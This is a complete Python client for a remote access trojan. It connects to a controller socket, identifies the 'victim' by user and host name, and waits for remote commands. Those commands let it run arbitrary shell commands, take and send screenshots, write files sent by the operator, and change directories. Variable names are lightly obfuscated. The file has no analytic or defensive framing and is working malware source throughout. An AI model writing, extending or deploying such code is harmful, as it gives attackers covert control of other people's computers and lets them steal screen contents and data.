import ast
import getpass
import os
import socket
import subprocess
import time
from colorama import Fore
import base64
from threading import Thread
import pyautogui

PORT = 55555
IP = "localhost"
FULLADDRESS = (IP, PORT)

HEADER = 1024

us3rn4me = getpass.getuser()
c1d = -1
v1ctimid = us3rn4me.lower()
pcname = socket.gethostname()
fullname = f"{us3rn4me}@{pcname}"

USERDIR = os.getenv("USERPROFILE")
APPDATA = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try:
        client.connect(FULLADDRESS)
        break
    except ConnectionRefusedError:
        pass

client.send(f"{fullname}|{v1ctimid}".encode())


def unsplit(list):
    value = ""
    for s in list:
        value += s + " "
    return value


def send(message):
    message = base64.b64encode(message)
    c = [message[i:i + HEADER] for i in range(0, len(message), HEADER)]
    client.send(str(len(c)).encode())
    for message in c:
        client.send(message)


def sendfile(path):
    with open(path,'rb+') as file:
        fbytes = file.read()
        file.close()
        bs = "\\"
        send(f"@filetransfer {os.path.normpath(path).split(bs)[-1]}|{base64.b64encode(fbytes)}".encode())


while True:
    command = ""
    chunks = client.recv(HEADER).decode()
    for i in range(int(chunks)):
        command += client.recv(HEADER).decode()
    command = base64.b64decode(command).decode()
    args = command.split(" ")
    print(args)
    if c1d == v1ctimid:
        if args[0] == "id":
            send(f"{Fore.GREEN}[{fullname}]{Fore.RESET} {fullname}".encode())

        elif args[0] == "cd":
            if len(args) > 1:
                try:
                    os.chdir(args[1])
                    send(
                        f"{Fore.GREEN}[{fullname}] [*] Current working directory changed to {os.getcwd()}{Fore.RESET}".encode())
                except OSError:
                    send(f"{Fore.RED}[{fullname}] [!] Invalid path{Fore.RESET}".encode())
            else:
                send(f"{Fore.RED}[{fullname}] [!] Invalid syntax{Fore.RESET}".encode())

        elif args[0] == "pwd":
            send(f"{Fore.GREEN}[{fullname}]{Fore.RESET} {os.getcwd()}".encode())
        elif args[0] == "screenshot":
            pyautogui.screenshot().save(TEMP + "\\ss.png")
            sendfile(TEMP + "\\ss.png")
            os.remove(TEMP + "\\ss.png")

        elif args[0] == "cmd":
            os.getcwd()
            if len(args) > 1:
                out = subprocess.run(f"cd {os.getcwd()} & {unsplit(args[1:])}", shell=True, capture_output=True).stdout
                send(out)

            else:
                send(f"{Fore.RED}[{fullname}] [!] Invalid syntax{Fore.RESET}".encode())

        elif args[0] == "upload":
            print("File download")
            filename = args[1].split("|")[0]
            filebytes = args[1].split("|")[1]

            with open(os.getcwd() + f"\\{filename}", 'wb+') as file:
                file.write(base64.b64decode(ast.literal_eval(filebytes)))
                file.close()
            send(f"{Fore.GREEN}[{fullname}] [*] File succesfully saved{Fore.RESET}".encode())

        elif args[0] == "download":
            if os.path.exists(args[1]):
                send(f"{Fore.GREEN}[{fullname}] [*] Sending file!{Fore.RESET}".encode())
        else:
            send(f"{Fore.RED}[{fullname}] [!] No such command found{Fore.RESET}".encode())

    else:
        if args[0] == "control":
            if len(args) > 1:
                c1d = args[1]
                if c1d == v1ctimid:
                    send(f"{Fore.GREEN}[{fullname}] [*] You are currently controlling {v1ctimid}".encode())
                else:
                    send(f"{Fore.GREEN}[{fullname}] [*] Command executed{Fore.RESET}".encode())
            else:
                send(f"{Fore.RED}[{fullname}] [!] Invalid syntax{Fore.RESET}".encode())
        else:
            send(
                f"{Fore.RED}[{fullname}] [!] No such command found or you are not controlling a client{Fore.RESET}".encode())
